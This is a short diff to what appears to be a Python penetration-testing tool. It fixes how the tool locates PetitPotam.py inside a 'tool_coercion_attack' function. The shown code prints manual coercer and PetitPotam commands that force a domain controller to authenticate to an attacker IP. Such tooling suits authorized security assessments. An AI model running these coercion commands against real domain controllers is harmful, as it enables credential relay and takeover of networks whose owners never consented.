@@ -7414,7 +7414,7 @@ def tool_coercion_attack(dc_ip: str, domain: str, username: str,
     petitpotam_py = _find_file("PetitPotam.py", [
         os.path.expanduser("~/.local/bin/PetitPotam.py"),
         "/opt/PetitPotam/PetitPotam.py",
-        str(Path(__file__).parent.parent / "tools" / "PetitPotam.py"),
+        str(Path(__file__).resolve().parents[2] / "tools" / "PetitPotam" / "PetitPotam.py"),
     ])
     printerbug_py = _find_file("printerbug.py", [
         os.path.expanduser("~/.local/bin/printerbug.py"),
@@ -7452,7 +7452,7 @@ def tool_coercion_attack(dc_ip: str, domain: str, username: str,
             "  git clone https://github.com/topotam/PetitPotam\n"
             "\nManual commands:\n"
             f"  coercer coerce -l {attacker_ip} -t {dc_ip} -u '{username}' -p '<pass>' -d {domain}\n"
-            f"  python3 PetitPotam.py {attacker_ip} {dc_ip} {domain}/{username}:<pass>"
+            f"  python3 tools/PetitPotam/PetitPotam.py {attacker_ip} {dc_ip} {domain}/{username}:<pass>"
         )
 
     add_finding("Coercion Attack Attempted", "High",
